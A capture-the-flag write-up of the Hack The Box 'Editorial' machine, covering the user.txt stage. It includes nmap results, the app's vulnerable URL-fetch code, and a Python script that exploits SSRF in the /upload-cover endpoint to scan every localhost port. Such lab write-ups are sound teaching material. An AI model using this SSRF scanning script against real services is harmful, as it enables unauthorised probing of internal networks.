# Key Takeaways
- Keep it simple and don't make assumptions... if something smells like SSRF, then enumerate localhost! (user.txt)
- Go to the documentation ASAP (root.txt)

# Editorial Overview
- Platform: Linux
- HTB Rating: Easy - Not Too Easy

# Solving User.txt
As we are starting off this machine with no information, I began with the typical nmap scans. We are given a pretty common setup, seeing SSH open and a single webserver on port 80.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

As the webserver seemed like the better initial target, I opened up Burp Suite alongside firefox and began seeing what it would have for us. Due to an initial error when accessing the webserver over just the IP, I first added `editorial.htb` into my /etc/hosts file, allowing us to access the site.

While poking around the website, I ran a number of directory and file brute forcing lists using `ffuf`, but none of these turned up anything useful. On the website itself, I was immediately drawn to the `/upload` page which gave us two extremely interesting options— submit a URL or upload a file. I then further looked at the page source, noting an interesting script related to this functionality:
```
        <script>
          document.getElementById('button-cover').addEventListener('click', function(e) {
            e.preventDefault();
            var formData = new FormData(document.getElementById('form-cover'));
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/upload-cover');
            xhr.onload = function() {
              if (xhr.status === 200) {
                var imgUrl = xhr.responseText;
                console.log(imgUrl);
                document.getElementById('bookcover').src = imgUrl;

                document.getElementById('bookfile').value = '';
                document.getElementById('bookurl').value = '';
              }
            };
            xhr.send(formData);
          });
        </script>
```

Taking note that this script was printing the uploaded file path to the console, this sent me looking for a file upload vulnerability. Interestingly, this app makes great use a best practice in mitigating file upload vulnerabilities— it is changing the filename to a long, random ID upon upload. This however is obviously counteracted by the fact that it then displays the path and new name directly to the user in the web console.
<img width="772" height="264" alt="image" src="https://github.com/user-attachments/assets/226874b3-bfd5-4590-8f02-bff5efd9f568" />
_Burp Suite request/response showing the new filename returned to the user_


I overcommitted to this path a bit too long. Due to the server returning the filepath alongside a lack of _any_ file type filters, this initially felt like a very strong point of entry that could lead to RCE. However, I eventually realized that the `/static/uploads` folder would not execute code. I later confirmed that the Nginx server was being used as a simple proxy and was not routing any files to an interpreter. This alongside the flask app itself having no way to execute the files meant that code execution from arbitrary file upload in this way would be a dead end.

I then looked toward the URL submission parameter, as anything that is accepting URLs without filtering screams Server Side Request Forgery (SSRF). While it definitely smelled like SSRF, I was initially tripped up by the fact that requests to http://localhost would simply time out, and didn't _seem_ to return any data. After playing with requests to `/upload-cover` in Burp Suite, I eventually realized that it WAS returning data, as it save the contents of the original request and then make a second request to display that content. This was later confirmed via the python code from the app itself below.
```python
# If cover comes from an URL
if url_bookcover:
    try: # Set default cover if exists a connection problem
        r = requests.get(url_bookcover, timeout=1)
    except:
        return default_cover

    # Save the response to the request in a file
    with open(app.config['UPLOAD_FOLDER'] + uuid_filename_cover, 'wb') as file_url_bookcover:
        file_url_bookcover.write(r.content)
```

While requests to `http://localhost` would time out, requests to `http://localhost:81` would not, making me feel that there also was not any weird localhost filtering going on. Armed with this knowledge, I crafted a basic Python script that would make a web request to `/upload-cover`, enumerating all localhost ports and returning the port number if it either timed out or returned a valid file. Note that the request parameters were pasted from Burp Suite using the "Copy As Python-Requests" extension.
```python
import requests

for port in range(1,65535):
    burp0_url = "http://editorial.htb:80/upload-cover"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://editorial.htb/upload", "Content-Type": "multipart/form-data; boundary=---------------------------42548592657882719163591992974", "Origin": "http://editorial.htb", "DNT": "1", "Connection": "keep-alive", "Priority": "u=0"}
    burp0_data = f"-----------------------------42548592657882719163591992974\r\nContent-Disposition: form-data; name=\"bookurl\"\r\n\r\nhttp://localhost:{port}\r\n-----------------------------42548592657882719163591992974\r\nContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------42548592657882719163591992974--\r\n"
    try:
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, timeout=3)
        if 'static/uploads' in r.text:
            print(f'Something on port {port} -- returned data')
    except requests.exceptions.Timeout:
        print(f'Something on port {port}')
```
